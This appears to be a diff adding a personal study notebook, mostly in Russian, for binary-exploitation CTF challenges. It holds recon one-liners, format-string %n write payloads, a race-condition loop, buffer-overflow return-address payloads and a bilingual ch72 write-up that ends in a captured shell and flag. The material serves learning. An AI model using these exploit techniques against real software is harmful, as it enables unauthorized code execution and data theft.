@@ -1,0 +1,411 @@
+========================================QESTIONS======================================
+Как работает bp, int3 0xCC, антиотладчик из GIS
+
+Почему есть LE и BE?
+
+Что даст return to libc?
+
+Сканеры уязвимостей
+
+Механика того что при доступе к format string можно получить все (как перезаписать а не добавить?)
+
+Почему по адресу rbp хранится предыдущий rbp??
+=====================================USEFUL===========================================
+Танненбаум Современные оп сис
+Взлом Приемы трюки и секреты хакеров
+
+
+    ASLR:     Enabledn
+    SHSTK:    Disabled
+    IBT:      Disabled
+
+
+
+===================================PATTERNS==========================================
+ПЕРВОЕ ПОСЛЕ file
+# быстрый набор
+strings -n 6 ./chall | egrep -i "%n|%s%p|get|scanf|sscanf|printf|fgets|fread|open|fopen|log|flag"
+objdump -d ./chall | egrep -n "printf|fscanf|scanf|gets|strcpy|strcat|memcpy|memmove|fread|fopen|fwrite|fgets"
+readelf -r ./chall
+readelf -x .data ./chall | sed -n '1,240p'
+nm -C ./chall | egrep " W | V | D | B "   # найти глобальные переменные и указатели
+objdump -d ./chall | grep -n "<read_log> -n" -n || objdump -d ./chall | grep -n "<read_log>"
+
+==============
+
+Как отличать saved RIP от других слов
+Если значение в диапазоне 0x400000..0x41ffff — это почти наверняка адрес в .text (т.е. saved RIP).
+Если значение в диапазоне 0x7fff... — значит адрес на стеке (saved RBP или указатель).
+Если значение в диапазоне 0x7ffff7... — это libc/динамическая библиотека. Может быть libc pointer (полезно для вычисления базы libc).
+Нули/случайные большие 64-битные константы — пропускаем.
+
+==========
+
+./ch14 `perl -e 'print "\xa8\xfa\xff\xbf","BBBB","\xa9\xfa\xff\xbf","BBBB","\xaa\xfa\xff\xbf","BBBB","\xab\xfa\xff\xbf","BBBB","%p"x7,"%154c","%n","%207c","%n","%239c","%n","%49c","%n"'`
+
+./ch14 "$(python3 -c 'import sys; sys.stdout.write("AAAA"*8 +"%p"*7+"%c%n%c%n%c%n%c%n")')"
+======================================
+(./ch12 &); while [ ! -f /tmp/tmp_file.txt ]; do sleep 0.001; done; cat /tmp/tmp_file.txt
+
+=======================================================
+run < <(python -c 'import sys; sys.stdout.write("A"*128 + "\x16\x85\x04\x08"); sys.stdout.flush()')
+
+
+
+(python -c 'import sys; sys.stdout.write(b"a"*24 + b"\x00\x10\x40\x00"); sys.stdout.flush()'; cat) | ./ch72.exe
+
+(python3 -c 'import sys; sys.stdout.buffer.write(b"A" * 280 + b"\xe7\x05\x40\x00\x00\x00\x00\x00")'; cat) | socat - EXEC:./ch35
+
+======================================
+
+for i in {1..200}; do ./ch5 %$i\$x; ./ch5 %$i\$s; echo  ' is '$i;  done | grep bffff
+
+# Ищем указатели, которые могут ссылаться на наш буфер
+for i in {1..200}; do
+    result=$(./ch5 "%$i\$p" 2>&1)
+    echo "Position $i: $result"
+    # Если видим разумный указатель стека, пробуем читать как строку
+    if [[ $result == 0x* ]] && [[ $result != 0x0 ]]; then
+        echo "Trying to read as string:"
+        ./ch5 "%$i\$s" 2>&1
+        echo
+    fi
+done
+
+--------
+
+Способ 6: Самый простой способ - использовать прямую интерпретацию
+bash
+# Преобразуем hex вывод в текст
+./ch5 "%2\$x%3\$x%4\$x%5\$x%6\$x%7\$x%8\$x" 2>&1 | sed 's/\([0-9a-f]\{2\}\)/\\x\1/g' | xargs printf
+
+======================================
+
+python -c "print('447061396436292845616d64'.decode('hex'))"
+
+
+for i in {10..15}; do
+    hex=$(./ch5 "%$i\$08x" 2>&1)
+    echo "Position $i: $hex -> $(echo $hex | sed 's/\(..\)\(..\)\(..\)\(..\)/\4\3\2\1/g' | xxd -r -p)"
+done
+
+echo "447061396436292845616d64" | xxd -r -p
+
+ltrace p/t/file
+
+objdump -d ch72.exe | grep -P -B15 -A5 '\b00\s+b0\s+41\s+00\b'
+
+генерация адреса
+========================
+ADDR=$(./ch14 "test" 2>&1 | grep "check at" | cut -d' ' -f3)
+echo "Check at: $ADDR"
+
+# Конвертируем адрес в little-endian бинарный формат
+ADDR_BIN=$(python -c "import struct; print(struct.pack('<I', 0x${ADDR:2:8}).encode('hex'))")
+echo "Address in binary: $ADDR_BIN"
+
+xxd 
+
+-p	Plain hex (без адресов и ASCII)	echo "Hello" | xxd -p → 48656c6c6f0a
+-r	Reverse (hex → binary)	echo "48656c6c6f" | xxd -r -p
+-l N	Ограничить длину	xxd -l 32 file
+-s N	Начать с offset	xxd -s 100 file
+-u	Uppercase hex	xxd -u file
+
+# Hex string → ASCII
+echo "48656c6c6f" | xxd -r -p
+
+#
+echo "01020304" | xxd -r -p > data.bin
+
+# Поиск JPEG заголовка
+xxd file.bin | grep "ff d8" 
+
+# Преобразовать вывод tcpdump
+tcpdump -X | xxd  
+
+echo "secret" | xxd -p  # → 7365637265740a
+
+xxd -s 0x100 -l 16 file.bin  # 16 байт с offset 0x100
+
+diff <(xxd file1) <(xxd file2)
+
+rabin2 -I p/t/file ; info
+rabin2 -z p/t/file ; strings
+
+| Флаг |        Коротко — что делает | Что показывает (важное)                                                                               | Когда использовать                                                                   | Пример команды                 |
+| ---- | --------------------------: | ----------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------ | ------------------------------ |
+| `-h` |            Заголовки секций | Список секций: `.text`, `.data`, `.bss`; `Size`, `VMA`, `LMA`, `File off`, `Algn`                     | Узнать, где лежит код и данные; вычислить базовый адрес `.text`                      | `objdump -h ch72.exe`          |
+| `-x` | Все заголовки (полный дамп) | ELF/PE заголовок, Program headers, динамические таблицы, импорты/экспорты, Entry point, секции и т.д. | Общая разведка бинарника: PIE/ASLR/entry point/импорты                               | `objdump -x ch72.exe`          |
+| `-t` |            Таблица символов | Символы: адрес, тип/биндинг (T/U), имя; аналог `nm`                                                   | Нужны имена функций/переменных (если бинар не stripped)                              | `objdump -t ch72.exe`          |
+| `-d` |          Дизассемблирование | Инструкции с адресами, prologue функций, `call`/`jmp`                                                 | Искать тело функций, адреса инструкций, вызовы типа `system` (работает без символов) | `objdump -d -M intel ch72.exe` |
+
+
+## Заметки 
+
+class std::string {
+    char* _M_start;  // указатель на данные
+    char* _M_finish; // указатель на конец данных
+    char* _M_end_of_storage; // указатель на конец выделенной памяти
+};
+$eax содержит адрес объекта std::string, который пришёл из plouf.
+Это не адрес символов, а адрес самой структуры std::string на стеке или в регистре.
+
+То есть, $eax указывает на структуру, а не на строку напрямую.
+$eax          = адрес std::string
+(void**) $eax = рассматриваем этот адрес как "указатель на указатель"
+*(void**) $eax = берём значение по этому указателю
+
+Найти разницу между *(void**) и *(eax)
+Напрямую он понимает что просто *(eax) но через ebp не понимает и нужно
+x /s *(void**)($ebp + 0x1c)
+0x804f4cc:      "Here_you_have_to_understand_a_little_C++_stuffs"
+зная структуру функции можно обращаться к тому что она принимает
+*(void**)($eax) = _m_start = фактический адрес символов строки
+
+## Строки
+strings ./binary — показать печатаемые строки
+strings -t x ./binary — показать строки с оффсетами
+objdump -d ./binary — дизассемблирование
+objdump -s -j .rodata ./binary — показать данные секции .rodata
+readelf -s ./binary — таблица символов
+readelf -x .rodata ./binary — сырой дамп секции .rodata
+
+set architecture mips
+set sysroot ~/mipsroot/buildroot/output/target
+set sysroot ~/mipsroot/buildroot/output/target
+target remote :1234
+break *0x0040093c
+display /i $pc
+display /c $v0
+display /c $v1
+display/x $a0
+display/s $a0
+continue
+si / какие еще есть степы?
+$ qemu-mipsel -g 1234 -L ~/mipsroot/buildroot/output/target ~/rtme/ch27.bin
+-g для remote
+
+###
+GO
+
+go tool nm ./binary — просмотр символов (имена функций и переменные)
+go tool objdump ./binary — дизассемблирование функций Go
+
+
+
+Для начала поищем строки с вызовом cmd.exe и их адреса:
+app-systeme-ch72@challenge05:~$ strings -t x ./ch72 | grep cmd.exe
+  1386c cmd.exe
+  19200 C:\Windows\system32\cmd.exe
+Вторая строка выглядит точно как наш вызов, посмотрим на адреса заголовков чтобы узнать где находится эта строка 
+objdump -h ch72.exe
+
+ch72.exe:     file format pei-i386
+
+Sections:
+Idx Name          Size      VMA       LMA       File off  Algn
+  0 .text         000128db  00401000  00401000  00000400  2**2
+                  CONTENTS, ALLOC, LOAD, READONLY, CODE
+  1 .rdata        000062a4  00414000  00414000  00012e00  2**2
+                  CONTENTS, ALLOC, LOAD, READONLY, DATA
+  2 .data         00000a00  0041b000  0041b000  00019200  2**2
+                  CONTENTS, ALLOC, LOAD, DATA
+  3 .gfids        000000b0  0041d000  0041d000  00019c00  2**2
+                  CONTENTS, ALLOC, LOAD, READONLY, DATA
+
+В данном случе адрес строки находится точно в начале data, в общем случае адрес можно посчитать как String File Offset=19200 - Header File Off=19200 + Header VMA=41b000
+
+Проверим упоминания этого адреса в дизассемблере
+
+objdump -d ch72.exe | grep "00 b0 41 00" -B5 -A5
+Disassembly of section .text:
+
+00401000 <.text>:
+  401000:       55                      push   %ebp
+  401001:       8b ec                   mov    %esp,%ebp
+  401003:       68 00 b0 41 00          push   $0x41b000
+  401008:       e8 bf 2b 00 00          call   0x403bcc
+  40100d:       83 c4 04                add    $0x4,%esp
+  401010:       5d                      pop    %ebp
+  401011:       c3                      ret
+  
+Отлично, мы видим вызов функции cmd по этому адресу, и нашли функцию  admin_shell, значит в payload должен быть адрес функции с началом в 401000
+
+main должен быть где-то рядом, посмотрим ниже
+
+app-systeme-ch72@challenge05:~$ objdump -d ch72.exe | grep "00 b0 41 00" -B5 -A55
+Disassembly of section .text:
+	...
+	...
+  401020:       55                      push   %ebp
+  401021:       8b ec                   mov    %esp,%ebp
+  401023:       83 ec 14                sub    $0x14,%esp
+  401026:       c6 45 ec 00             movb   $0x0,-0x14(%ebp)
+  40102a:       33 c0                   xor    %eax,%eax
+  40102c:       89 45 ed                mov    %eax,-0x13(%ebp)
+  40102f:       89 45 f1                mov    %eax,-0xf(%ebp)
+  401032:       89 45 f5                mov    %eax,-0xb(%ebp)
+  401035:       66 89 45 f9             mov    %ax,-0x7(%ebp)
+  401039:       88 45 fb                mov    %al,-0x5(%ebp)
+  40103c:       8d 4d ec                lea    -0x14(%ebp),%ecx
+  40103f:       51                      push   %ecx
+  401040:       e8 96 30 00 00          call   0x4040db
+  401045:       83 c4 04                add    $0x4,%esp
+  401048:       c7 45 fc 00 00 00 00    movl   $0x0,-0x4(%ebp)
+  40104f:       eb 09                   jmp    0x40105a
+  401051:       8b 55 fc                mov    -0x4(%ebp),%edx
+  401054:       83 c2 01                add    $0x1,%edx
+  401057:       89 55 fc                mov    %edx,-0x4(%ebp)
+  40105a:       83 7d fc 10             cmpl   $0x10,-0x4(%ebp)
+  40105e:       7d 1a                   jge    0x40107a
+  401060:       8b 45 fc                mov    -0x4(%ebp),%eax
+  401063:       0f be 4c 05 ec          movsbl -0x14(%ebp,%eax,1),%ecx
+  401068:       51                      push   %ecx
+  401069:       e8 ee 2e 00 00          call   0x403f5c
+  40106e:       83 c4 04                add    $0x4,%esp
+  401071:       8b 55 fc                mov    -0x4(%ebp),%edx
+  401074:       88 44 15 ec             mov    %al,-0x14(%ebp,%edx,1)
+  401078:       eb d7                   jmp    0x401051
+  40107a:       8d 45 ec                lea    -0x14(%ebp),%eax
+  40107d:       50                      push   %eax
+  40107e:       68 1c b0 41 00          push   $0x41b01c
+  401083:       e8 58 00 00 00          call   0x4010e0
+  401088:       83 c4 08                add    $0x8,%esp
+  40108b:       33 c0                   xor    %eax,%eax
+  40108d:       8b e5                   mov    %ebp,%esp
+  40108f:       5d                      pop    %ebp
+  
+  Мы нашли наш main, на 401026 мы видим sub    $0x14,%esp, резервация 20 байт на стеке под локальные переменные, 16 байт буфера и 4, скорее всего под счетчик i
+  
+  Получается адрес возврата будет храниться следующим образом buf=16b|var=4b|EBP=4b|return address=4b
+  Итог 24 + ra, следовательно payload должен выглядить примерно так:   
+  (python -c 'import sys; sys.stdout.write(b"a"*24 + b"\x00\x10\x40\x00"); sys.stdout.flush()'; cat) | ./ch72.exe
+  
+  Попробуем:
+  (python -c 'import sys; sys.stdout.write(b"a"*24 + b"\x00\x10\x40\x00"); sys.stdout.flush()'; cat) | ./wrapper.sh
+
+Microsoft Windows [Version 10.0.17763.737]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\cygwin64\challenge\app-systeme\ch72>whoami
+whoami
+app-systeme-ch72-crk
+C:\cygwin64\challenge\app-systeme\ch72>type .\.passwd
+type .\.passwd
+there_is_the_flag
+
+Вот и он!
+
+Маленькие замечания/улучшения для отчёта
+
+В тексте лучше уточнить, что strings -t x даёт file offsets, и сразу показать, как переводишь их в VMA (формула и пример ты уже привёл — отлично).
+
+Можно явно указать, что найденная инструкция push 0x41b000 / call ... / ret — это сам admin_shell (или что по адресам видно, что функция в 0x401000 делает push адреса и вызывает system). В твоём дизассемблере видно, что функция в 0x401000 — короткая обёртка: пушит аргумент и вызывает. Хорошо бы прямо подписать «это админская функция».
+
+На будущее: при подсчётах полезно использовать pattern/cyclic (pwntools) чтобы точно найти оффсет, если сомневаешься. Но в данном случае ты посчитал корректно
+
+Let's start by searching string literals that contain "cmd.exe" and their addresses:
+
+<code>app-systeme-ch72@challenge05:~$ strings -t x ./ch72 | grep cmd.exe
+  1386c cmd.exe
+  19200 C:\Windows\system32\cmd.exe</code>
+
+The second string looks exactly like our call, so let's check the header addresses to find where this string is located:
+
+<code>objdump -h ch72.exe
+
+ch72.exe:     file format pei-i386
+
+Sections:
+Idx Name          Size      VMA       LMA       File off  Algn
+  0 .text         000128db  00401000  00401000  00000400  2**2
+                  CONTENTS, ALLOC, LOAD, READONLY, CODE
+  1 .rdata        000062a4  00414000  00414000  00012e00  2**2
+                  CONTENTS, ALLOC, LOAD, READONLY, DATA
+  2 .data         00000a00  0041b000  0041b000  00019200  2**2
+                  CONTENTS, ALLOC, LOAD, DATA
+  3 .gfids        000000b0  0041d000  0041d000  00019c00  2**2
+                  CONTENTS, ALLOC, LOAD, READONLY, DATA</code>
+
+In this case, the string's address is exactly at the start of the <code>.data</code> section. In general, the address can be calculated as:
+
+<code>String File Offset (19200) - Header File Off (19200) + Header VMA (41b000) = 0x0041b000</code>
+
+Let's check for references to this address in the disassembler:
+
+<code>objdump -d ch72.exe | grep "00 b0 41 00" -B5 -A5
+Disassembly of section .text:
+
+00401000 <.text>:
+  401000:       55                      push   %ebp
+  401001:       8b ec                   mov    %esp,%ebp
+  401003:       68 00 b0 41 00          push   $0x41b000
+  401008:       e8 bf 2b 00 00          call   0x403bcc
+  40100d:       83 c4 04                add    $0x4,%esp
+  401010:       5d                      pop    %ebp
+  401011:       c3                      ret</code>
+
+Great, we see the call to <code>cmd</code> at this address, and we've found the <code>admin_shell</code> function. This means our payload should include the function's address starting at <code>0x401000</code>.
+The <code>main</code> function should be nearby, so let's look further down:
+
+<code>app-systeme-ch72@challenge05:~$ objdump -d ch72.exe | grep "00 b0 41 00" -B5 -A55
+Disassembly of section .text:
+	...
+	...
+  401020:       55                      push   %ebp
+  401021:       8b ec                   mov    %esp,%ebp
+  401023:       83 ec 14                sub    $0x14,%esp
+  401026:       c6 45 ec 00             movb   $0x0,-0x14(%ebp)
+  40102a:       33 c0                   xor    %eax,%eax
+  40102c:       89 45 ed                mov    %eax,-0x13(%ebp)
+  40102f:       89 45 f1                mov    %eax,-0xf(%ebp)
+  401032:       89 45 f5                mov    %eax,-0xb(%ebp)
+  401035:       66 89 45 f9             mov    %ax,-0x7(%ebp)
+  401039:       88 45 fb                mov    %al,-0x5(%ebp)
+  40103c:       8d 4d ec                lea    -0x14(%ebp),%ecx
+  40103f:       51                      push   %ecx
+  401040:       e8 96 30 00 00          call   0x4040db
+	...
+	...</code>
+
+We've found our main function. At <code>401026</code>, a bit lower we see <code>sub $0x14,%esp</code>, reserving 20 bytes on the stack for local variables: 16 bytes for the buffer and 4 bytes, likely for the loop counter <code>i</code>.
+This means the return address is stored as follows: <code>buf=16b | var=4b | EBP=4b | return address=4b</code>.
+Total: <code>24 bytes + return address</code>. Therefore, the payload should look something like this:
+
+<code>(python -c 'import sys; sys.stdout.buffer.write(b"a"*24 + b"\x00\x10\x40\x00"); sys.stdout.flush()'; cat) | ./ch72.exe
+
+Microsoft Windows [Version 10.0.17763.737]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\cygwin64\challenge\app-systeme\ch72>whoami
+whoami
+app-systeme-ch72-crk
+C:\cygwin64\challenge\app-systeme\ch72>type .\.passwd
+type .\.passwd
+{there_is_the_flag}</code>
+
+There it is!  B-)
+
+
+
+# покажем текущий rbp
+p/x $rbp
+
+# покажем два слова в текущем кадре (prev_rbp, return_addr)
+x/2gx $rbp
+
+# теперь прочитаем prev_rbp и снова покажем два слова в нём
+# в GDB: вручную
+set $rb = *(long*)$rbp        # $rb = prev_rbp
+x/2gx $rb                    # покажет prev_rbp2, return_addr2
+# повторяй: set $rb = *(long*)$rb
+
+
+python
+rb = int(gdb.parse_and_eval("$rbp"))
+for i in range(6):
+    print(hex(rb), gdb.execute("x/2gx %d" % rb, to_string=True).strip())
+    rb = int(gdb.parse_and_eval("*(long*)%d" % rb))
+end
+end
